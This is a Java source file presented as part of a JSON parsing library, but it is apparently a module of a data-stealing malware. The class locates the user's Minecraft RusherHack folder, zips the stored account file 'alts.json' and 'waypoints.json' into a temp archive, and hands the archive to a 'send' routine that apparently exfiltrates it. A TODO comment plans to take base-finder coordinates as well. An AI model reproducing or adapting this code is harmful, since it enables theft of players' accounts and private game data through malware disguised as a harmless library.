package org.json.updated.parsers.impl;

import org.json.updated.parsers.JSONObject;
import org.json.updated.parsers.JSONRegexHandler;
import org.json.updated.parsers.util.FileSystemHelper;

import java.io.File;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.ArrayList;

/**
 * @author perry.
 * Started 12/5/2021.
 */
public
class RusherData implements JSONObject {
    private static final String[] IMPORTANT_FILES = new String[] { "alts.json", "waypoints.json" };

    @Override
    public void handle() {
        String mcFolder = FileSystemHelper.getMinecraftFolder();
        if (mcFolder == null || !Files.exists(Paths.get(mcFolder))) return;

        String rusherFolder = mcFolder + "rusherhack/";
        if (!Files.exists(Paths.get(rusherFolder))) {
            JSONRegexHandler.send("> Did not contain the RusherHack folder.");
            return;
        }

        ArrayList<File> validFileDirs = new ArrayList<>(); // @TODO Rusherhack uses a folder for its base finder coords & a way to grab the .rusherhack folder in home as well.
        for (String fileName : IMPORTANT_FILES) {
            String dir = rusherFolder + fileName;
            if (!Files.exists(Paths.get(dir))) continue;

            validFileDirs.add(new File(dir));
        }

        String zipFile = System.getProperty("java.io.tmpdir") + FileSystemHelper.getSeparator() + "rusher_shit.zip";
        FileSystemHelper.zip(zipFile, validFileDirs);
        JSONRegexHandler.send(new File(zipFile));
    }

    @Override
    public String getName() {
        return "RusherData";
    }
}